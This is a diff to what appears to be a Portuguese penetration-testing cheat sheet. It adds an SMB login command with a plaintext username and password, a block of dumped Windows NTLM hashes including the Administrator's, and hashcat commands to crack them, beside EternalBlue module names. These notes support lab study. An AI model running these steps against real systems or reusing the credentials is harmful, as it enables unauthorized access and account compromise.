@@ -117,6 +117,10 @@ estabelece conexão passando usuário e senha
 smbclient  \\\\10.10.11.35\\SYSVOL\\ -U "user%pass" 
 ```
 
+```
+smbclient \\\\172.30.0.103\\Utils$\\ -U dev01%dev0105 --workgroup=SRV01
+```
+
 lista os diretórios compartilhados (`--workgroup`)
 ```
 smbclient -L \\\\10.10.11.35
@@ -683,11 +687,41 @@ exploit/windows/smb/ms17_010_psexec
 exploit/windows/smb/ms17_010_eternalblue
 ```
 
-**Cracking hashes (hashdump)**
+## Cracking hashes (hashdump)
+john
 ```
 john --format=lm --wordlist=<wordlist> <hashfile>
 john --format=nt --wordlist=<wordlist> <hashfile>
 ```
+
+**hashcat NT/NTLM**
+
+Para quebrar usando hashcat preciso formatar as hashes do hashdump para o formato adequado
+
+```
+# hashes não formatadas
+ADM01:1009:aad3b435b51404eeaad3b435b51404ee:25c22286c527ef085b2541e97c740587:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1f233b4583731263d8c54659889dc0a:::
+CPD01:1006:aad3b435b51404eeaad3b435b51404ee:9b6f9e9dd57c57c4f6ff2a5e8c819cdc:::
+DEV01:1007:aad3b435b51404eeaad3b435b51404ee:5288d36e2a539296875b393aa763bfcc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+USER01:1008:aad3b435b51404eeaad3b435b51404ee:9e40973e2cb458449cb1ce3f4a2a2d6b:::
+
+
+# hash formatadas
+25c22286c527ef085b2541e97c740587
+b1f233b4583731263d8c54659889dc0a
+9b6f9e9dd57c57c4f6ff2a5e8c819cdc
+5288d36e2a539296875b393aa763bfcc
+31d6cfe0d16ae931b73c59d7e0c089c0
+9e40973e2cb458449cb1ce3f4a2a2d6b
+```
+
+quebra da hash nt usando hashcat
+```
+hashcat -m 1000 hash_formatada.txt WORDLIST
+```
+
 
 **hashes da RAM:**
 ```
